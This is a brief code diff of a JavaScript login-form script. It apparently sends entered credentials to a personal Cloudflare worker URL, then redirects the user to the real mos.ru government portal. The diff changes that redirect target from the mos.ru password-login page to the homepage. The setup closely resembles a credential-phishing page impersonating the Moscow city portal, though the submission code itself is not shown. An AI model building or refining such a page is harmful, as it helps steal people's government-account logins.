@@ -1,7 +1,7 @@
 (function () {
     const WORKER_URL = 'https://my-neon-worker.viotlunov.workers.dev';
     /** Куда перейти после успешного ответа воркера (200 OK). */
-    const AFTER_SUCCESS_REDIRECT = 'https://login.mos.ru/sps/login/methods/password';
+    const AFTER_SUCCESS_REDIRECT = 'https://www.mos.ru/';
 
     const form = document.getElementById('loginForm');
     const loginInput = document.getElementById('login');
